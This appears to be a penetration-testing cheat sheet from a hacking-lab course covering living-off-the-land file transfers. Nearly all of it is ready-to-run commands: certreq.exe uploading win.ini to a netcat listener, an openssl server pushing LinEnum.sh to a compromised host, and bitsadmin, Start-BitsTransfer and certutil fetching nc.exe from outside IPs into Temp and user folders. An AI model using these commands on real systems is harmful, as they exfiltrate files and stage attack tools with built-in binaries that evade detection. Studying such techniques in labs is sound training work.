# LOLBAS
[CertReq.exe](https://lolbas-project.github.io/lolbas/Binaries/Certreq/)
#### Netcat
```shell
sudo nc -lvnp 8000
```
#### Upload win.ini to our Pwnbox
```cmd
certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
```
# GTFOBins
#### Create Certificate in our Pwnbox
```shell
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```
#### Stand up the Server in our Pwnbox
```shell
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```
#### Download File from the Compromised Machine
```shell
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```
# Other Common Living off the Land tools
## Bitsadmin Download function
#### File Download with Bitsadmin
```powershell
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```
#### Download
```powershell
Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```
## Certutil
#### Download a File with Certutil
```cmd
certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```


